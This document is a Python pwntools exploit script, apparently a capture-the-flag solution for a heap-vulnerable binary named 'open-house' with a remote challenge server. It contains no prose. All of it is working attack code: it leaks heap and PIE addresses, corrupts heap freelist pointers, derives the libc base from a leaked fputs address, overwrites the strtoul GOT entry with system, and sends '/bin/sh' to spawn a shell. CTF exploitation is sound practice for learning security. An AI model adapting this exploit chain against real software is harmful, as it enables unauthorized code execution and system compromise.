from pwn import *

binary = './open-house'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

if args.REMOTE:
    libc = ELF('./libc.so',checksec=False)
else:
    libc = e.libc

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("open-house-6dvpeatmylgze.shellweplayaga.me", 10001)
    else:
        return process(e.path)


def submit_ticket():
    ticket = b'ticket{redacted}'
    p.recvuntil(b'Ticket please:')
    p.sendline(ticket)
    log.info('Sent Ticket')


def create(data):
    p.recvuntil(b'c|')
    p.sendline(b'c')
    p.sendlineafter(b'love to have your review!', data)


def view():
    p.recvuntil(b'c|')
    p.sendline(b'v')


def modify(idx, data):
    p.recvuntil(b'c|')
    p.sendline(b'm')
    p.recvuntil(b'Which of these reviews should we replace?')
    p.sendline(b'%i' % idx)
    p.recvuntil(b'What do you think we should we replace it with?')
    p.sendline(data)


def delete(idx):
    p.recvuntil(b'c|')
    p.sendline(b'd')
    p.recvuntil(b'Which of these reviews should we delete?')
    p.sendline(b'%i' % idx)


def leaks():
    log.info('Leaking Heap and PIE Base Addresses')
    create(b'A'*0x512)
    create(b'B'*0x512)
    for i in range(0, 12):
        delete(i+1)
    create(b'A'*0x512)
    create(b'B'*0x512)
    p.recvuntil(b'c|')
    p.sendline(b'v')
    p.recvuntil(b'A'*512)
    leak = p.recvline().strip(b'\n')
    heap_addr = u64(leak[0:4].ljust(8, b'\x00'))-(0x56e91650-0x56e8f008)
    log.info('Heap Leak: 0x%x' % heap_addr)
    free_addr = u64(leak[4:8].ljust(8, b'\x00'))-0x40
    e.address = free_addr-e.got['free']
    log.info('PIE Base: 0x%x' % e.address)


def overwrite_ptrs(victim):
    log.info('Overwriting Bk/Fd Pointers to 0x%x' %victim)
    create(b'C'*512)
    modify(1, b'X'*512+p32(victim)+p32(victim))


def leak_libc():
    log.info('Leaking Libc Base Address')
    p.recvuntil(b'c|')
    p.sendline(b'v')
    p.recvuntil(b'**** - ')
    p.recvuntil(b'**** - ')
    leak_libc = p.recvline().strip(b'\n')
    libc_addr = u32(leak_libc[len(leak_libc)-4:len(leak_libc)])
    log.info('Libc (fputs) Leak: 0x%x' % libc_addr)
    libc.address = libc_addr-libc.sym['fputs']
    log.info('Libc Base: 0x%x' % libc.address)


def got_overwrite(target):
    log.info('Overwriting GOT Entry with 0x%x' %target)
    p.sendline(b'm')
    p.recvuntil(b'Which of these reviews should we replace?')
    p.sendline(b'11')
    p.recvuntil(b'What do you think we should we replace it with?')
    p.send(p32(target))


def shell():
    log.info('Delivering Shell')
    p.sendline(b'\n')
    p.sendline(b'm')
    p.sendline(b'/bin/sh')
    p.recvuntil(b'Which of these reviews should we replace?')


p = start()

if args.REMOTE:
    submit_ticket()

leaks()
overwrite_ptrs(e.got['strtoul'])
leak_libc()
got_overwrite(libc.sym['system'])
shell()

p.interactive()
